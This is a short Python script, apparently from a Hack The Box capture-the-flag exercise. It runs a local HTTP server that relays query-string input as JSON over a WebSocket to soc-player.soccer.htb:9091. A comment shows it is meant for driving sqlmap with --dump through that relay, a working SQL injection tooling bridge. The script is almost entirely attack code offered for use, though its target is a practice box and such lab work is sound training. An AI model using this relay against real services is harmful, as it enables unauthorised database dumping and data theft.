import asyncio
import json
from http.server import SimpleHTTPRequestHandler
from socketserver import TCPServer
from urllib.parse import urlparse
from urllib.parse import unquote

import websockets


async def call_ws(data):
    uri = "ws://soc-player.soccer.htb:9091/"
    async with websockets.connect(uri) as websocket:
        c = json.dumps({"id":data})
        print("Sent: " + c)
        await websocket.send(c)
        res = await websocket.recv()
        print("Got: " + res)
        return res


def middleware_server(host_port, content_type="text/plain"):
    class CustomHandler(SimpleHTTPRequestHandler):
        def do_GET(self) -> None:
            self.send_response(200)
            try:
                payload = urlparse(self.path).query.split('=', 1)[1]
                payload = unquote(payload)
            except IndexError:
                payload = False

            if payload:
                content = asyncio.run(call_ws(payload))
            else:
                content = 'No parameters specified!'

            self.send_header("Content-type", content_type)
            self.end_headers()
            self.wfile.write(content.encode())
            return

    class _TCPServer(TCPServer):
        allow_reuse_address = True

    httpd = _TCPServer(host_port, CustomHandler)
    httpd.serve_forever()


if __name__ == "__main__":
    # sqlmap -u http://localhost:8081?a=1 --dump
    middleware_server(('0.0.0.0',8081))
